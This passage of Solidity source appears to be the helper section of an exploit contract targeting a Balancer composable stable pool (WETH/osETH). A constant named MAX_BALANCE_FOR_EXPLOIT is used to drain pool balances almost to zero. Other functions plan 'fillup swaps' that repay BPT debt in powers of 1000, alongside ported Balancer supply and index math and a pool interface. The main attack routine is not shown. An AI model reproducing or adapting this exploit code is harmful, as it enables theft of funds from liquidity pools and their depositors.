        // When a user "joins" by swapping token in for BPT out, BPT moves OUT of the pool's Vault balance,
        // which means there is MORE BPT outside the pool (higher circulating/virtual supply).

        if (bptDelta > 0) {
            // BPT enters the pool (exit flow): circulating supply decreases.
            return supply.sub(uint256(bptDelta));
        } else if (bptDelta < 0) {
            // BPT leaves the pool (join flow): circulating supply increases.
            return supply.add(uint256(-bptDelta));
        }
        return supply;
    }

    // -----------------------------------------------------------------------------
    // Math and array helpers
    // -----------------------------------------------------------------------------

    // @note: missing comment
    function _calcAmountOut(uint256 balance) private pure returns (uint256) {
        uint256 amountOut = balance.sub(balance.divDown(100e18));
        if (balance - amountOut < MAX_BALANCE_FOR_EXPLOIT) {
            amountOut = balance.sub(MAX_BALANCE_FOR_EXPLOIT);
        }
        return amountOut;
    }

    // Returns the amount of BPT to be paid out to cover the BPT debt.
    // We want to pay back the BPT debt in increasing powers of 1000.
    // We first pay back 1000 BPT then 1_000_000 BPT then 1_000_000_000 BPT, etc.
    // until we have paid back the entire BPT debt.
    function _calcBptAmountOut(
        uint256 bptOwed,
        uint256 formerAmountOut
    ) private pure returns (uint256) {
        uint256 bptOut = formerAmountOut.mulUp(1000e18);
        return bptOut > bptOwed ? bptOwed : bptOut;
    }

    function _dropBptItem(
        uint256[] memory values
    ) private pure returns (uint256[] memory dropped) {
        // Balancer helper (ported):
        // Convert an array that includes BPT in the middle (WETH, BPT, osETH)
        // into an array of only the "real" stable tokens (WETH, osETH).
        dropped = new uint256[](values.length - 1);
        for (uint256 i = 0; i < dropped.length; ++i) {
            dropped[i] = values[i < _BPT_INDEX ? i : i + 1];
        }
    }

    function _skipBptIndex(uint256 index) private pure returns (uint256) {
        // Balancer helper (ported):
        // Translate a Vault "registered token index" (includes BPT at index 1)
        // into the index used by StableMath (BPT removed).
        //
        // Vault:      [WETH=0, BPT=1, osETH=2]
        // StableMath: [WETH=0, osETH=1]
        require(index != _BPT_INDEX, "INDEX_IS_BPT");
        return index < _BPT_INDEX ? index : index - 1;
    }

    // Mutate the balances array by applying the balance changes (deltas).
    function _mutateBalances(
        uint256[] memory balances,
        int256[] memory deltas
    ) private pure {
        for (uint256 i = 0; i < balances.length; ++i) {
            if (deltas[i] > 0) {
                balances[i] = balances[i].add(uint256(deltas[i]));
            } else if (deltas[i] < 0) {
                balances[i] = balances[i].sub(uint256(-deltas[i]));
            }
        }
    }

    function _cloneUint256Array(
        uint256[] memory source
    ) private pure returns (uint256[] memory cloned) {
        cloned = new uint256[](source.length);
        for (uint256 i = 0; i < source.length; ++i) {
            cloned[i] = source[i];
        }
    }

    // Calculate the number of fillup swaps needed to cover the BPT debt.
    // We want to pay back the BPT debt in increasing powers of 1000.
    // We first pay back 1000 BPT then 1_000_000 BPT then 1_000_000_000 BPT, etc.
    // until we have paid back the entire BPT debt.

    function _getFillupSwaps(uint256 bptOwed) private pure returns (uint256 n) {
        while (bptOwed > 0) {
            bptOwed = bptOwed.divDown(1000e18);
            n++;
        }
    }
}


interface IComposableStablePool {
    function getAmplificationParameter()
        external
        view
        returns (uint256 value, bool isUpdating, uint256 precision);

    function getProtocolFeePercentageCache(uint256 feeType)
        external
        view
        returns (uint256);

    function getPoolId() external view returns (bytes32);

    function getSwapFeePercentage() external view returns (uint256);

    function updateTokenRateCache(IERC20 token) external;

    function getScalingFactors()
        external
        view
        returns (uint256[] memory);

    function getActualSupply() external view returns (uint256);
}

enum ProtocolFeeType {
    SWAP,
    FLASH_LOAN,
    YIELD,
    AUM
}